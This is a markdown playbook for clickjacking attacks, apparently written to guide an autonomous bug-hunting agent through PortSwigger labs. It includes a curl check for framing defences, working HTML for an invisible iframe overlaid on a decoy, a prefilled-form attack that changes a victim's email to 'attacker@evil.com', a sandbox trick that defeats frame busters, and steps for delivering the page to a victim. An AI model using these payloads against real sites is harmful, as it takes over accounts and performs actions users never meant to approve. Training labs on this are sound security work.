# Clickjacking Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> Frame the target, overlay a decoy, and trick the victim into clicking a
> sensitive control. Viable only when framing defenses are weak/absent.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Check Framing Defenses
```bash
curl -sk https://target/my-account -D- -o /dev/null | grep -iE "x-frame-options|content-security-policy"
```
- `X-Frame-Options: DENY|SAMEORIGIN` → blocked (unless bypassable)
- `CSP: frame-ancestors 'none'|'self'` → blocked
- Neither present → framable

### 1.2 Identify a One-Click Sensitive Action
- Delete account, change email, approve, transfer — ideally single-click
- Note whether the action pre-fills from URL params (for combined attacks)

---

## Phase 2: Exploitation Techniques

### 2.1 Basic Overlay
```html
<style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:800px;
           opacity:0.0001; z-index:2; }
  #decoy { position:absolute; z-index:1; }
</style>
<div id="decoy" style="top:495px; left:80px;">Click me</div>
<iframe src="https://target/my-account"></iframe>
```
Align the decoy under the real button using pixel offsets (`top`/`left`).

### 2.2 Prefilled-Form Clickjacking
- Pass values via query string so the framed form is pre-populated:
  `https://target/my-account/change-email?email=attacker@evil.com`
- Victim's single click submits attacker-controlled data.

### 2.3 Clickjacking + DOM XSS
- Frame a page with a DOM-XSS sink fed by a URL param; the victim's click
  triggers the payload in their authenticated context.

### 2.4 Multi-Step (Frame Busting Bypass)
- Defeat weak JS frame-busters with `sandbox="allow-forms allow-scripts"`
  (omit `allow-top-navigation`) so the buster cannot navigate the top window.

---

## Phase 3: PortSwigger Lab-Specific Techniques
- **Basic clickjacking with CSRF token protection**: framing defeats the token
  because the browser sends it automatically.
- **Clickjacking with form input**: prefill `email` via query string.
- **Clickjacking with a frame buster script**: use the `sandbox` attribute.
- **Combining clickjacking with DOM XSS**: overlay the decoy over the XSS click.

---

## Phase 4: Tools & Automation
- Iterate `top`/`left`/`opacity` until the decoy aligns with the target button.
- Test at `opacity:0.1` while developing, drop to `0.0001` for delivery.
- Deliver via the exploit server "Store" + "Deliver to victim".

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| XFO/CSP frame-ancestors set | Not exploitable via framing |
| Decoy misaligned | Adjust pixel offsets; account for iframe scroll |
| JS frame buster | Use iframe `sandbox` without allow-top-navigation |

## Success Criteria
- [ ] Victim's click performed the sensitive action inside the frame
- [ ] Delivered via exploit server
- [ ] Lab shows "solved"
